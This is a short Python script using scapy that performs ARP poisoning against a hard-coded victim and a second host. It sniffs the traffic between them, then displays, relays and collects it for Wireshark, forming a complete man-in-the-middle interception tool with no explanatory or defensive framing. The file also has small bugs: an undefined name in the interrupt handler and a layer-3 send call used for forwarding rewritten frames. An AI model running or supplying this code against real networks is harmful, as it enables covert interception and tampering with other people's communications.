from scapy.all import *
import multiprocessing
import time
class MITM:
  packets=[]
  def __init__(self,victim=("10.0.0.212","00:0c:29:48:0d:2a" ),node2=("10.110.167.60", "00:0c:29:90:e5:ac")):
    self.victim=victim
    self.node2=node2
    multiprocessing.Process(target=self.arp_poison).start()
    try:
      sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.node2[0], self.victim[0],self.victim[0],self.node2[0]),prn=lambda x:self.routep(x))
    except KeyboardInterrupt as e:
      wireshark(packets)
    #self.arp_poison()
  def routep(self,packet):
    if packet.haslayer(IP):
      packet.show()
      if packet[IP].dst==self.victim[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.victim[1]
      elif packet[IP].dst==self.node2[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.node2[1]
      self.packets.append(packet)
      packet.display()
      send(packet)
      print(len(self.packets))
      if len(self.packets)==10:
        wireshark(self.packets)
  def arp_poison(self):
    a=ARP()
    a.psrc=self.victim[0]
    a.pdst=self.node2[0]
    b=ARP()
    b.psrc=self.node2[0]
    b.pdst=self.victim[0]
    cond=True
    while cond:
      send(b)
      send(a)
      time.sleep(5)
      #cond=False
if __name__=="__main__":
  mitm=MITM()